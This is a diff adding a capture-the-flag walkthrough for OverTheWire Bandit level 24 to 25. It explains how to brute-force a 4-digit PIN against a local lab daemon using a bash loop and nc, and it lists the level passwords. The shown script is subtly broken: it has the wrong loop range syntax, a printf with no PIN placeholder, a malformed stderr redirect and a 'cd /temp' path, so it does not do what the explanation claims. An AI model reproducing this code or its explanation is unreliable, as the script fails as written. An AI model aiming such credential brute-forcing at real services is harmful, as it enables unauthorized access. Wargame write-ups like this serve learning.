@@ -1,0 +1,23 @@
+Level-24 -> Level-25
+Description: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password 
+             for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by 
+             going through all of the 10000 combinations, called brute-forcing.
+             You do not need to create new connections each time
+Explanation: To send bandit 24 password along with pin variations ranging from 0000 to 9999 we make use of "for" loop. 
+	      We use "printf" instead of "echo" because it is faster. We connect to the localhost using "nc" command on
+	      port 30002 with error messages having status "2" redirected to "/dev/null" to reduce errors being displayed. 
+              "grep -q" is used to check if a pattern exists in a file or output, without displaying any results. 
+	      If the correct PIN is found it is displayed on screen.
+Connection: ssh -p 2220 bandit24@bandit.labs.overthewire.org
+Command-1: cd /temp
+Command-2: cat > brute_force.sh << 'EOF'
+#!/bin/bash
+
+for i in (0000..9999); do 
+	printf "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" $i | nc localhost 30002 2 > /dev/null |  grep -q "Wrong" || echo "Success $i"
+done
+EOF
+Command-3: chmod +x brute_force.sh
+Command-4: ./brute_force.sh
+Comamnd-5: echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 5062" | nc localhost 30002
+Level-25 Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
